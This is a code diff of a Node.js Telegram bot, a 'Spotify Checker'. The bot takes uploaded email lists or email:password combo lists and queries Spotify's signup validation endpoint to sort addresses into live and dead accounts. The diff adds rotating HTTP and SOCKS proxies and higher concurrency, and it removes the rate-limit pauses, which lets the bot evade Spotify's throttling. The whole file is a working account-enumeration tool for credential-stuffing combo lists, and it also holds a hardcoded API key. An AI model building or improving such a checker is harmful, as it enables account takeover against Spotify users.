@@ -1,33 +1,28 @@
 const { Telegraf, Markup } = require('telegraf');
 const axios = require('axios');
+const { SocksProxyAgent } = require('socks-proxy-agent');
+const { HttpProxyAgent } = require('http-proxy-agent');
 const fs = require('fs');
 const path = require('path');
 const express = require('express');
 
 // ==============================================
-// ⚙️ CONFIG — TWEAK THESE IF YOU SEE ERRORS
+// 🔑 CONFIGURATION — Set in Render Dashboard!
 // ==============================================
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const API_KEY = 'a1e486e2729f46d6bb368d6b2bcda326';
+const CONCURRENCY = 5;
+const PROXY_CONCURRENCY = 3; // Max concurrent requests per proxy
+const MAX_RETRIES = 2;
+const TIMEOUT = 10000;
 
-// 🚦 Stability settings — start conservative, adjust later
-const CONCURRENCY = 2;        // Check 2 at a time — gentle & safe
-const BATCH_DELAY = 300;      // 300ms pause between batches
-const RETRY_DELAY_429 = 3000; // 3s wait when rate-limited
-const MAX_RETRIES = 2;        // Retry transient errors twice
-
-// Express health check for Render uptime ping
+// Express health check
 const app = express();
 const PORT = process.env.PORT || 3000;
-app.get('/', (req, res) => res.send('✅ Spotify Checker Bot — Online'));
+app.get('/', (req, res) => res.send('✅ Spotify Checker Bot is Running!'));
 app.listen(PORT, () => console.log(`🌐 Keepalive server on port ${PORT}`));
 
-if (!BOT_TOKEN) {
-  console.error('❌ ERROR: BOT_TOKEN environment variable is not set!');
-  process.exit(1);
-}
-
-const bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 30000 });
+const bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 300000 });
 
 const headers = {
   'authority': 'spclient.wg.spotify.com',
@@ -44,134 +39,132 @@ const clientInfo = {
   platform: 'www',
 };
 
+// ==============================================
+// 🛠️ PROXY PARSING & AGENT CREATION
+// ==============================================
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
+function parseProxy(proxyStr) {
+  proxyStr = proxyStr.trim();
+  if (!proxyStr) return null;
+
+  let type = 'http';
+  let host, port, username, password;
+
+  // Format: type://host:port OR host:port:user:pass
+  if (proxyStr.includes('://')) {
+    const [proto, rest] = proxyStr.split('://');
+    type = proto.toLowerCase();
+    if (rest.includes('@')) {
+      const [auth, hp] = rest.split('@');
+      [username, password] = auth.split(':');
+      [host, port] = hp.split(':');
+    } else {
+      [host, port] = rest.split(':');
+    }
+  } else {
+    const parts = proxyStr.split(':');
+    if (parts.length === 4) {
+      [host, port, username, password] = parts;
+    } else if (parts.length === 2) {
+      [host, port] = parts;
+    }
+  }
+
+  if (!host || !port) return null;
+  return { type, host: host.trim(), port: parseInt(port), username, password };
+}
+
+function createProxyAgent(proxy) {
+  if (!proxy) return null;
+  const { type, host, port, username, password } = proxy;
+  const auth = username && password ? `${username}:${password}@` : '';
+  const uri = `${type}://${auth}${host}:${port}`;
+
+  if (type === 'socks4' || type === 'socks5') {
+    return new SocksProxyAgent(uri);
+  }
+  return new HttpProxyAgent(uri);
+}
+
+// Round-robin proxy selector
+class ProxyRotator {
+  constructor(proxies) {
+    this.proxies = proxies.filter(p => p !== null);
+    this.index = 0;
+    this.stats = { total: this.proxies.length, working: 0, failed: 0 };
+  }
+
+  next() {
+    if (this.proxies.length === 0) return null;
+    const proxy = this.proxies[this.index % this.proxies.length];
+    this.index++;
+    return proxy;
+  }
+
+  markWorking() { this.stats.working++; }
+  markFailed() { this.stats.failed++; }
+}
+
 // ==============================================
-// 🔍 SINGLE EMAIL CHECK — Improved Logic
+// 📧 CHECK EMAIL WITH PROXY SUPPORT
 // ==============================================
-async function checkEmail(email) {
+async function checkEmail(email, proxyRotator) {
   const jsonData = {
     fields: [{ field: 'FIELD_EMAIL', value: email.trim() }],
     client_info: clientInfo,
     tracking: { creation_point: 'https://open.spotify.com/artist/59YhsSefd7itecSNMp0Nv8' },
   };
 
-  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
+  for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
+    const proxy = proxyRotator.next();
+    const agent = proxy ? createProxyAgent(proxy) : null;
+
     try {
       const res = await axios.post(
         'https://spclient.wg.spotify.com/signup/public/v2/account/validate',
         jsonData,
         {
           headers,
-          timeout: 10000,
-          validateStatus: (status) => status < 500 // Don't throw on 4xx responses
+          timeout: TIMEOUT,
+          httpAgent: agent?.httpAgent,
+          httpsAgent: agent?.httpsAgent || agent,
         }
       );
 
+      proxyRotator.markWorking();
       const resJson = res.data;
 
-      // ✅ Clear status logic
-      if (resJson.error !== undefined) {
-        const errorStr = String(resJson.error).toLowerCase();
-        if (errorStr.includes('already_exists') || errorStr.includes('exists')) {
-          return { status: 'VALID', item: email };
-        }
-        // Other error messages = treat as Unknown
-        return { status: 'UNKNOWN', item: email, reason: resJson.error };
+      if (resJson.error && String(resJson.error).includes('already_exists')) {
+        return { status: 'VALID', item: email, proxy: proxy?.host };
+      } else if (resJson.success) {
+        return { status: 'DEAD', item: email, proxy: proxy?.host };
       }
-
-      if (resJson.success === true) {
-        return { status: 'DEAD', item: email };
-      }
-
-      // Any other response = Unknown
-      return { status: 'UNKNOWN', item: email, reason: 'Unexpected response' };
+      return { status: 'UNKNOWN', item: email, proxy: proxy?.host };
 
     } catch (err) {
-      // 🚦 Rate-limited
+      if (proxy) proxyRotator.markFailed();
       if (err.response?.status === 429) {
-        console.log(`⚠️  Rate limited on ${email} — attempt ${attempt + 1}/${MAX_RETRIES}, waiting ${RETRY_DELAY_429}ms`);
-        await sleep(RETRY_DELAY_429);
+        await sleep(2000);
         continue;
       }
-
-      // 🔁 Retry on connection/timeout errors
-      const retryCodes = ['ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND', 'ECONNABORTED', 'EAI_AGAIN'];
-      if (retryCodes.includes(err.code) && attempt + 1 < MAX_RETRIES) {
-        await sleep(1000);
-        continue;
+      if (attempt === MAX_RETRIES) {
+        return { status: 'ERROR', item: email, error: err.message, proxy: proxy?.host };
       }
-
-      // ❌ Failed permanently
-      return {
-        status: 'ERROR',
-        item: email,
-        error: err.code || err.message.slice(0, 60)
-      };
+      await sleep(500);
     }
   }
-
   return { status: 'ERROR', item: email, error: 'Max retries exceeded' };
 }
 
 // ==============================================
-// 💾 RESULTS HELPERS
+// 💾 USER STATE MANAGEMENT
 // ==============================================
-function restoreFullItem(mode, items, email, resultItem) {
-  if (mode === 'emails') return email;
-  // Find original full combo line from email match
-  const found = items.find(line => {
-    const lineEmail = line.split(':')[0].trim();
-    return lineEmail.toLowerCase() === email.toLowerCase();
-  });
-  return found || resultItem;
-}
+const userState = new Map();
+// { mode: 'emails'|'combo', items: [], proxies: [], stage: 'awaiting_items'|'awaiting_proxies'|'ready' }
 
 // ==============================================
-// 📦 BATCH PROCESSING
-// ==============================================
-async function processBatch(items, mode, onProgress) {
-  const valid = [], dead = [], unknown = [], errors = [];
-  let checked = 0;
-
-  for (let i = 0; i < items.length; i += CONCURRENCY) {
-    const batch = items.slice(i, i + CONCURRENCY);
-
-    const promises = batch.map(async (item) => {
-      const email = mode === 'emails' ? item : item.split(':')[0].trim();
-      return checkEmail(email);
-    });
-
-    const results = await Promise.all(promises);
-
-    for (const r of results) {
-      const fullItem = restoreFullItem(mode, items, r.item, r.item);
-
-      if (r.status === 'VALID') valid.push(fullItem);
-      else if (r.status === 'DEAD') dead.push(fullItem);
-      else if (r.status === 'UNKNOWN') unknown.push(`${fullItem} — ${r.reason || 'Unknown'}`);
-      else errors.push(`${fullItem} — ${r.error}`);
-    }
-
-    checked += batch.length;
-    onProgress(checked, valid.length, dead.length, unknown.length, errors.length);
-
-    // Pause between batches
-    if (i + CONCURRENCY < items.length) {
-      await sleep(BATCH_DELAY);
-    }
-  }
-
-  return { valid, dead, unknown, errors };
-}
-
-// ==============================================
-// 📂 USER MODE STORAGE
-// ==============================================
-const userMode = new Map();
-
-// ==============================================
-// 🤖 BOT COMMANDS
+// 🎯 BOT INTERFACE
 // ==============================================
 bot.start((ctx) => {
   try {
@@ -186,175 +179,208 @@ bot.start((ctx) => {
 });
 
 bot.action('mode_emails', (ctx) => {
-  userMode.set(ctx.chat.id, 'emails');
+  userState.set(ctx.chat.id, { mode: 'emails', items: [], proxies: [], stage: 'awaiting_items' });
   ctx.answerCbQuery();
-  ctx.reply(
-    '📧 **Mode: Email Only**\n\nSend a .txt file with one email per line.',
-    { parse_mode: 'Markdown' }
-  );
+  ctx.reply('📧 **Email-Only Mode Selected**\n📂 Send your email list (.txt, one per line):', { parse_mode: 'Markdown' });
 });
 
 bot.action('mode_combo', (ctx) => {
-  userMode.set(ctx.chat.id, 'combo');
+  userState.set(ctx.chat.id, { mode: 'combo', items: [], proxies: [], stage: 'awaiting_items' });
   ctx.answerCbQuery();
-  ctx.reply(
-    '🔐 **Mode: Combo Checker**\n\nSend a .txt file with `email:password` per line.',
-    { parse_mode: 'Markdown' }
-  );
+  ctx.reply('🔐 **Combo Mode Selected**\n📂 Send your combo list (.txt, format: email:password per line):', { parse_mode: 'Markdown' });
 });
 
 bot.command('mode', (ctx) => {
-  ctx.reply(
-    '🔄 Switch checking mode:',
+  ctx.reply('🔄 Choose your mode:',
     Markup.inlineKeyboard([
-      [Markup.button.callback('📧 Emails Only', 'mode_emails')],
-      [Markup.button.callback('🔐 Combos', 'mode_combo')]
+      [Markup.button.callback('📧 Check Emails Only', 'mode_emails')],
+      [Markup.button.callback('🔐 Check Combos', 'mode_combo')]
     ])
   );
 });
 
 bot.help((ctx) => {
-  ctx.reply(
-    `📖 **Spotify Checker Bot — Help**\n\n` +
-    `• /mode — Switch between Emails or Combos mode\n` +
-    `• Send .txt file — Start checking immediately\n\n` +
-    `📊 Live counters: 🟢 Live | 🔴 Dead | 🟡 Unknown | 🔵 Errors\n` +
-    `⚡ Settings: ${CONCURRENCY} parallel, ${BATCH_DELAY}ms batch delay`
-  );
+  ctx.reply(`📖 **How to Use:**
+1. /mode — Select Email or Combo mode
+2. Upload your list file
+3. Upload your proxy file (HTTP/SOCKS4/SOCKS5)
+   - Format: host:port OR host:port:user:pass
+   - Or full URL: socks5://user:pass@host:port
+4. Bot starts automatically!
+
+⚡ Concurrency: ${CONCURRENCY} | Retries: ${MAX_RETRIES}
+Made by: @PLANECLOUD | @DK_CE`, { parse_mode: 'Markdown' });
 });
 
 // ==============================================
-// 📄 FILE UPLOAD & MAIN WORKFLOW
+// 📄 FILE UPLOAD HANDLER
 // ==============================================
 bot.on('document', async (ctx) => {
   try {
     const file = ctx.message.document;
-
     if (!file.file_name.endsWith('.txt')) {
-      return ctx.reply('⚠️ Please upload a **.txt** file only.', { parse_mode: 'Markdown' });
+      return ctx.reply('⚠️ Please send only **.txt files!**', { parse_mode: 'Markdown' });
     }
 
-    const mode = userMode.get(ctx.chat.id) || 'combo';
-    const modeLabel = mode === 'emails' ? '📧 Email-Only Mode' : '🔐 Combo Mode';
+    const state = userState.get(ctx.chat.id);
+    if (!state) return ctx.reply('⚠️ Please run /mode first to select your mode!');
 
-    await ctx.reply(
-      `📥 File received: **${file.file_name}**\n` +
-      `${modeLabel}\n` +
-      `⚡ Concurrency: ${CONCURRENCY} | Delay: ${BATCH_DELAY}ms\n` +
-      `⏳ Downloading file...`,
-      { parse_mode: 'Markdown' }
-    );
-
-    // Download & parse file
+    // Download file content
     const fileLink = await ctx.telegram.getFileLink(file.file_id);
     const res = await axios.get(fileLink.href, { responseType: 'text', timeout: 30000 });
+    const lines = res.data.split('\n').map(l => l.trim()).filter(l => l);
 
-    let items = [];
-    if (mode === 'emails') {
-      items = res.data.split('\n').map(l => l.trim()).filter(l => l);
-    } else {
-      items = res.data.split('\n').filter(line => {
-        const t = line.trim();
-        return t && t.includes('@') && t.includes(':');
-      });
+    // STEP 1: Process items list
+    if (state.stage === 'awaiting_items') {
+      let validItems = [];
+      if (state.mode === 'emails') {
+        validItems = lines.filter(l => l.includes('@'));
+        if (validItems.length === 0) return ctx.reply('❌ No valid emails found!');
+        state.items = validItems;
+      } else {
+        validItems = lines.filter(l => l.includes(':'));
+        if (validItems.length === 0) return ctx.reply('❌ No valid combos found!');
+        state.items = validItems;
+      }
+
+      state.stage = 'awaiting_proxies';
+      userState.set(ctx.chat.id, state);
+      return ctx.reply(
+        `✅ Received **${file.file_name}** — ${validItems.length} items loaded!\n\n🌐 Now send your **proxy list (.txt)**\nSupports: HTTP, SOCKS4, SOCKS5`,
+        { parse_mode: 'Markdown' }
+      );
     }
 
-    if (items.length === 0) {
-      return ctx.reply('❌ No valid entries found. Check your mode and file format.');
+    // STEP 2: Process proxy list and start checking
+    if (state.stage === 'awaiting_proxies') {
+      const proxies = lines.map(parseProxy).filter(p => p !== null);
+      if (proxies.length === 0) return ctx.reply('❌ No valid proxies found! Check format.');
+
+      const proxyRotator = new ProxyRotator(proxies);
+      state.stage = 'ready';
+      userState.set(ctx.chat.id, state);
+
+      const modeLabel = state.mode === 'emails' ? '📧 Email-Only' : '🔐 Combo';
+      await ctx.reply(
+        `🚀 **Starting Checker!**\n\n` +
+        `📊 Mode: ${modeLabel}\n` +
+        `📥 Items: ${state.items.length}\n` +
+        `🌐 Proxies: ${proxyRotator.stats.total}\n` +
+        `⚡ Concurrency: ${CONCURRENCY}\n` +
+        `⏳ Please wait...`,
+        { parse_mode: 'Markdown' }
+      );
+
+      // ==============================================
+      // ⚡ PROCESS BATCH WITH PROXIES
+      // ==============================================
+      const total = state.items.length;
+      const progressMsg = await ctx.reply(
+        `⏳ Progress: 0/${total} (0%)\n\n` +
+        `🟢 𝗟𝗶𝘃𝗲: 0\n` +
+        `🔴 𝗗𝗲𝗮𝗱: 0\n` +
+        `🟡 𝗨𝗻𝗸𝗻𝗼𝘄𝗻: 0\n` +
+        `🔵 𝗘𝗿𝗿𝗼𝗿𝘀: 0`
+      );
+
+      const results = { valid: [], dead: [], unknown: [], errors: [] };
+      let checked = 0;
+
+      const updateMessage = async () => {
+        const percent = Math.round((checked / total) * 100);
+        try {
+          await ctx.telegram.editMessageText(
+            ctx.chat.id,
+            progressMsg.message_id,
+            undefined,
+            `⏳ 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: ${checked}/${total} (${percent}%)\n\n` +
+            `🟢 𝗟𝗶𝘃𝗲: ${results.valid.length}\n` +
+            `🔴 𝗗𝗲𝗮𝗱: ${results.dead.length}\n` +
+            `🟡 𝗨𝗻𝗸𝗻𝗼𝘄𝗻: ${results.unknown.length}\n` +
+            `🔵 𝗘𝗿𝗿𝗼𝗿𝘀: ${results.errors.length}\n` +
+            `🌐 Proxies OK: ${proxyRotator.stats.working} | Failed: ${proxyRotator.stats.failed}`
+          );
+        } catch {}
+      };
+
+      // Process in batches
+      for (let i = 0; i < state.items.length; i += CONCURRENCY) {
+        const batch = state.items.slice(i, i + CONCURRENCY);
+        const promises = batch.map(async (item) => {
+          const email = state.mode === 'emails' ? item : item.split(':')[0].trim();
+          const result = await checkEmail(email, proxyRotator);
+
+          // Preserve full combo in results
+          if (state.mode === 'combo' && result.item) {
+            const fullCombo = state.items.find(s => s.startsWith(result.item + ':'));
+            if (fullCombo) result.item = fullCombo;
+          }
+          return result;
+        });
+
+        const batchResults = await Promise.all(promises);
+        batchResults.forEach(r => {
+          if (r.status === 'VALID') results.valid.push(r.item);
+          else if (r.status === 'DEAD') results.dead.push(r.item);
+          else if (r.status === 'UNKNOWN') results.unknown.push(r.item);
+          else results.errors.push(`${r.item} — ${r.error}`);
+        });
+
+        checked += batch.length;
+        await updateMessage();
+        await sleep(Math.floor(Math.random() * 50 + 10));
+      }
+
+      // ==============================================
+      // 📤 SEND RESULTS
+      // ==============================================
+      const summary =
+        `✅ ✅ 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅ ✅\n\n` +
+        `📊 𝗧𝗼𝘁𝗮𝗹: ${total}\n` +
+        `🟢 𝗟𝗶𝘃𝗲: ${results.valid.length}\n` +
+        `🔴 𝗗𝗲𝗮𝗱: ${results.dead.length}\n` +
+        `🟡 𝗨𝗻𝗸𝗻𝗼𝘄𝗻: ${results.unknown.length}\n` +
+        `🔵 𝗘𝗿𝗿𝗼𝗿𝘀: ${results.errors.length}\n\n` +
+        `🌐 𝗣𝗿𝗼𝘅𝗶𝗲𝘀: ${proxyRotator.stats.total} total | ${proxyRotator.stats.working} used | ${proxyRotator.stats.failed} failed\n\n` +
+        `Made by: @PLANECLOUD | @DK_CE`;
+
+      await ctx.reply(summary);
+
+      // Save & send files
+      const outputPath = path.join(__dirname, 'outputs');
+      if (!fs.existsSync(outputPath)) fs.mkdirSync(outputPath);
+
+      fs.writeFileSync(path.join(outputPath, 'live.txt'), results.valid.join('\n'));
+      fs.writeFileSync(path.join(outputPath, 'dead.txt'), results.dead.join('\n'));
+      fs.writeFileSync(path.join(outputPath, 'unknown.txt'), results.unknown.join('\n'));
+      fs.writeFileSync(path.join(outputPath, 'errors.txt'), results.errors.join('\n'));
+      fs.writeFileSync(path.join(outputPath, 'full_results.txt'),
+        `=== 𝗟𝗜𝗩𝗘 (${results.valid.length}) ===\n${results.valid.join('\n')}\n\n` +
+        `=== 𝗗𝗘𝗔𝗗 (${results.dead.length}) ===\n${results.dead.join('\n')}\n\n` +
+        `=== 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 (${results.unknown.length}) ===\n${results.unknown.join('\n')}\n\n` +
+        `=== 𝗘𝗥𝗥𝗢𝗥𝗦 (${results.errors.length}) ===\n${results.errors.join('\n')}`
+      );
+
+      await ctx.replyWithDocument({ source: path.join(outputPath, 'live.txt'), filename: 'live.txt' });
+      await ctx.replyWithDocument({ source: path.join(outputPath, 'dead.txt'), filename: 'dead.txt' });
+      await ctx.replyWithDocument({ source: path.join(outputPath, 'unknown.txt'), filename: 'unknown.txt' });
+      await ctx.replyWithDocument({ source: path.join(outputPath, 'errors.txt'), filename: 'errors.txt' });
+      await ctx.replyWithDocument({ source: path.join(outputPath, 'full_results.txt'), filename: 'full_results.txt' });
+      await ctx.reply('📤 All results sent! ✅');
+
+      // Cleanup
+      fs.rmSync(outputPath, { recursive: true, force: true });
+      userState.delete(ctx.chat.id);
     }
-
-    const total = items.length;
-
-    // Send initial progress message
-    const progressMsg = await ctx.reply(
-      `⏳ **Progress: 0/${total} (0%)**\n\n` +
-      `🟢 **Live:** 0\n` +
-      `🔴 **Dead:** 0\n` +
-      `🟡 **Unknown:** 0\n` +
-      `🔵 **Errors:** 0`,
-      { parse_mode: 'Markdown' }
-    );
-
-    // Real-time progress updater
-    const updateMessage = async (checked, v, d, u, e) => {
-      const percent = Math.round((checked / total) * 100);
-      try {
-        await ctx.telegram.editMessageText(
-          ctx.chat.id,
-          progressMsg.message_id,
-          undefined,
-          `⏳ **Progress: ${checked}/${total} (${percent}%)**\n\n` +
-          `🟢 **Live:** ${v}\n` +
-          `🔴 **Dead:** ${d}\n` +
-          `🟡 **Unknown:** ${u}\n` +
-          `🔵 **Errors:** ${e}`,
-          { parse_mode: 'Markdown' }
-        );
-      } catch {}
-    };
-
-    // Run checker
-    const results = await processBatch(items, mode, updateMessage);
-
-    // Final summary
-    const summary =
-      `✅ **✅ CHECK COMPLETE ✅**\n\n` +
-      `📊 **Total:** ${total}\n` +
-      `🟢 **Live:** ${results.valid.length}\n` +
-      `🔴 **Dead:** ${results.dead.length}\n` +
-      `🟡 **Unknown:** ${results.unknown.length}\n` +
-      `🔵 **Errors:** ${results.errors.length}\n\n` +
-      `File: ${file.file_name}\n` +
-      `Made by: @PKay`;
-
-    await ctx.reply(summary, { parse_mode: 'Markdown' });
-
-    // Save output files
-    const outputPath = path.join(__dirname, 'outputs');
-    if (!fs.existsSync(outputPath)) fs.mkdirSync(outputPath);
-
-    fs.writeFileSync(path.join(outputPath, 'live.txt'), results.valid.join('\n'));
-    fs.writeFileSync(path.join(outputPath, 'dead.txt'), results.dead.join('\n'));
-    fs.writeFileSync(path.join(outputPath, 'unknown.txt'), results.unknown.join('\n'));
-    fs.writeFileSync(path.join(outputPath, 'results.txt'),
-      `=== LIVE (${results.valid.length}) ===\n${results.valid.join('\n')}\n\n` +
-      `=== DEAD (${results.dead.length}) ===\n${results.dead.join('\n')}\n\n` +
-      `=== UNKNOWN (${results.unknown.length}) ===\n${results.unknown.join('\n')}\n\n` +
-      `=== ERRORS (${results.errors.length}) ===\n${results.errors.join('\n')}`
-    );
-
-    // Send files
-    await ctx.replyWithDocument(
-      { source: path.join(outputPath, 'live.txt'), filename: 'live.txt' }
-    );
-    await ctx.replyWithDocument(
-      { source: path.join(outputPath, 'dead.txt'), filename: 'dead.txt' }
-    );
-    await ctx.replyWithDocument(
-      { source: path.join(outputPath, 'unknown.txt'), filename: 'unknown.txt' }
-    );
-    await ctx.replyWithDocument(
-      { source: path.join(outputPath, 'results.txt'), filename: 'results.txt' }
-    );
-
-    await ctx.reply('📤 All files sent! ✅');
-
-    // Cleanup
-    fs.rmSync(outputPath, { recursive: true, force: true });
 
   } catch (err) {
-    console.error('❌ Top-level error:', err.message);
-    try {
-      await ctx.reply(`⚠️ Error: ${err.message}`);
-    } catch {}
+    console.error('❌ Processing error:', err.message);
+    await ctx.reply(`⚠️ Error: ${err.message}`);
   }
 });
 
-// ==============================================
-// 🛡️ ERROR HANDLING
-// ==============================================
 bot.catch((err, ctx) => {
-  console.error('❌ Bot error:', err.message, '| Update:', ctx.updateType);
+  console.error('❌ Bot error:', err.message);
 });
 
 // ==============================================
@@ -364,10 +390,9 @@ async function startBot() {
   try {
     console.log('🔄 Connecting to Telegram...');
     await bot.launch();
-    console.log('✅ Bot is running — send /start in Telegram!');
-    console.log(`⚡ Settings: Concurrency=${CONCURRENCY}, Delay=${BATCH_DELAY}ms, Retries=${MAX_RETRIES}`);
+    console.log('✅ Bot is running! Check Telegram!');
   } catch (err) {
-    console.error('❌ Failed to start bot:', err.message);
+    console.error('❌ Failed to start:', err.message);
     process.exit(1);
   }
 }
